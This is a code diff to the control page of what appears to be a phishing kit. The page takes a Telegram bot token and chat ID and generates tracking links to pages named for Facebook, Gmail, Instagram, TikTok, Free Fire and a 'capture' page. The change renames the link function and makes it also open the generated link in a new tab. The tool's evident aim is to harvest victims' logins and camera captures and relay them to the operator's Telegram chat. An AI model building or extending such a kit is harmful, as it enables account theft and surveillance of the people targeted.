@@ -137,12 +137,12 @@
         <input type="password" id="botToken" name="botToken" required>
         <br>
         <div class="buttons">
-            <button type="button" onclick="generateLink('capture.html', 'Capture')">Capture</button>
-            <button type="button" onclick="generateLink('facebook.html', 'Facebook')">Facebook</button>
-            <button type="button" onclick="generateLink('freefier.html', 'Freefire')">Freefire</button>
-            <button type="button" onclick="generateLink('gmail.html', 'Gmail')">Gmail</button>
-            <button type="button" onclick="generateLink('intagram.html', 'Instagram')">Instagram</button>
-            <button type="button" onclick="generateLink('tiktok.html', 'TikTok')">TikTok</button>
+            <button type="button" onclick="generateLinkAndRun('capture.html', 'Capture')">Capture</button>
+            <button type="button" onclick="generateLinkAndRun('facebook.html', 'Facebook')">Facebook</button>
+            <button type="button" onclick="generateLinkAndRun('freefier.html', 'Freefire')">Freefire</button>
+            <button type="button" onclick="generateLinkAndRun('gmail.html', 'Gmail')">Gmail</button>
+            <button type="button" onclick="generateLinkAndRun('intagram.html', 'Instagram')">Instagram</button>
+            <button type="button" onclick="generateLinkAndRun('tiktok.html', 'TikTok')">TikTok</button>
             <button type="button" onclick="openAboutMe()">About Me</button>
         </div>
     </form>
@@ -153,7 +153,7 @@
     </div>
 
     <script>
-        function generateLink(page, name) {
+        function generateLinkAndRun(page, name) {
             const chatId = document.getElementById('chatId').value;
             const botToken = document.getElementById('botToken').value;
             if (!chatId || !botToken) {
@@ -164,6 +164,7 @@
             const link = `${baseUrl}/${page}?chatId=${encodeURIComponent(chatId)}`;
             document.getElementById('linkContainer').innerHTML = `Your ${name} link is: <a href="${link}" target="_blank">${link}</a>`;
             sendLinkToTelegram(chatId, botToken, `Your ${name} link is: ${link}`);
+            window.open(link, "_blank"); // Open the link in a new tab
         }
 
         async function sendLinkToTelegram(chatId, botToken, message) {
